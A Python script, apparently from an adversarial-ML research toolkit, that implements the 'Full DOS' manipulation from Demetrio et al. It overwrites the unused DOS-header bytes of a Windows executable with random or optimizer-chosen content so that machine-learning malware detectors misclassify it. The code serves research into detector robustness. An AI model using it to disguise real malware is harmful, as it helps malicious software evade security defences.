"""
Implementation of Full DOS practical manipulation from
Adversarial EXEmples: A Survey and Experimental Evaluation of
Practical Attacks on Machine Learning for Windows Malware Detection
by Demetrio et al.

Can be used standalone with random bytes or via genetic optimizer.
"""

import os
import sys
import copy

import lief


def full_dos_on_bytes(exe_bytes: bytearray, section_population, vector_t):
    """
    Implementation of Full DOS practical manipulation. 
    Intended for use with genetic optimizer.

    Returns the bytes with the practical manipulation applied.
    """

    content = bytearray()
    for i, section in enumerate(section_population):
        content += section[:int(round(len(section) * vector_t[i]))]

    exe_object: lief.PE.Binary = lief.parse(exe_bytes)

    # get range allowed to perturb
    pe_header_offset = exe_object.dos_header.addressof_new_exeheader
    range_to_perturb = list(range(2, 0x3c)) + \
        list(range(0x40, pe_header_offset))

    raw_bytes = copy.deepcopy(exe_bytes)

    # perturb DOS header
    counter = 0
    for i in range_to_perturb:
        raw_bytes[i] = content[counter % len(content)]
        counter += 1

    return raw_bytes


def full_dos(exe_path):
    """
    Implementation of Full DOS practical manipulation.

    Create an adversarial example with practical manipulation applied.
    Random bytes are used and new sample has "_full_dos" as postfix.
    """

    print(f"Executing Full DOS manipulation on: {exe_path}")

    exe_object: lief.PE.Binary = lief.parse(exe_path)

    # get range allowed to perturb
    pe_header_offset = exe_object.dos_header.addressof_new_exeheader
    range_to_perturb = list(range(2, 0x3c)) + \
        list(range(0x40, pe_header_offset))

    with open(exe_path, 'r+b') as f:
        raw_bytes = bytearray(f.read())

        # perturb DOS header
        for i in range_to_perturb:
            raw_bytes[i] = ord(os.urandom(1))

        with open(f"{exe_path[:-4]}_full_dos.exe", 'wb') as nf:
            # create executable
            nf.write(raw_bytes)


# run as script
if __name__ == "__main__":
    full_dos(sys.argv[1])
